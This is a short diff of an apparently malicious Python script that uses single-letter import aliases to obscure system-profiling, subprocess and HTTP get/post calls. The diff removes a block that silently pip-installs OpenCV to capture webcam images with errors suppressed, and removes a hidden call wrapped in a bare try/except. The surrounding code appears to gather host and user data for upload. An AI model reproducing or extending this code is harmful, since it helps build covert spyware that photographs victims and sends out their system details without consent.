@@ -9,13 +9,6 @@ from platform import version as O, architecture as P
 from subprocess import check_output as Q
 from re import search as R
 from requests import get as S, post as T
-try:
-    E('pip install opencv-python')
-    from cv2 import VideoCapture as U, imwrite as V
-
-except Exception:
-    pass
-
 
 
 
@@ -251,10 +244,6 @@ def h():
 
 
 def am():
-    try:
-        X()
-    except Exception:
-        pass
     an = h()
     ao = {
         'username': 'ud',
